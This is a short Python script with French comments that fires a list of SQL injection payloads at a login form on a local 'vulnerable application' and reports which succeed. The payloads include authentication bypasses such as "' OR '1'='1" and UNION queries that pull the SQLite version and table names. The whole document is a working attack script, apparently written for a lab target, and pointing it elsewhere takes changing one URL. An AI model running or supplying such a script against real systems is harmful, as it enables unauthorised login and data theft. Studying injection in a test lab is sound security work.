import requests
import time

# URL de l'application vulnérable
BASE_URL = "http://localhost:5000/login"

def test_sql_injection(payload, password="anything"):
    """Teste une charge d'injection SQL et affiche le résultat"""
    print(f"\n[*] Test avec payload: {payload}")
    
    # Données à envoyer dans la requête POST
    data = {
        "username": payload,
        "password": password
    }
    
    # Envoi de la requête
    start_time = time.time()
    response = requests.post(BASE_URL, data=data)
    elapsed_time = time.time() - start_time
    
    # Analyse de la réponse
    print(f"[+] Temps de réponse: {elapsed_time:.2f} secondes")
    print(f"[+] Code de statut: {response.status_code}")
    print(f"[+] Taille de la réponse: {len(response.text)} caractères")
    
    # Vérification si la connexion a réussi
    if "Bienvenue" in response.text:
        print("[+] SUCCÈS: Injection réussie!")
        print(f"[+] Réponse: {response.text.strip()}")
        return True
    else:
        print("[-] ÉCHEC: L'injection n'a pas fonctionné")
        return False

def main():
    print("=== Test d'injection SQL sur l'application vulnérable ===")
    
    # Liste des payloads à tester
    payloads = [
        # Payloads basiques
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "admin' --",
        
        # Payloads plus avancés
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 1,'admin',3 --",
        
        # Payload pour extraire des informations sur la base de données
        "' UNION SELECT 1, sqlite_version(), 3 --",
        
        # Payload pour tenter d'extraire des noms de tables
        "' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' --"
    ]
    
    # Test de chaque payload
    successful_payloads = []
    for payload in payloads:
        if test_sql_injection(payload):
            successful_payloads.append(payload)
    
    # Résumé
    print("\n=== Résumé des tests ===")
    if successful_payloads:
        print(f"[+] {len(successful_payloads)} payloads ont réussi:")
        for i, payload in enumerate(successful_payloads, 1):
            print(f"  {i}. {payload}")
    else:
        print("[-] Aucun payload n'a réussi")

if __name__ == "__main__":
    main() 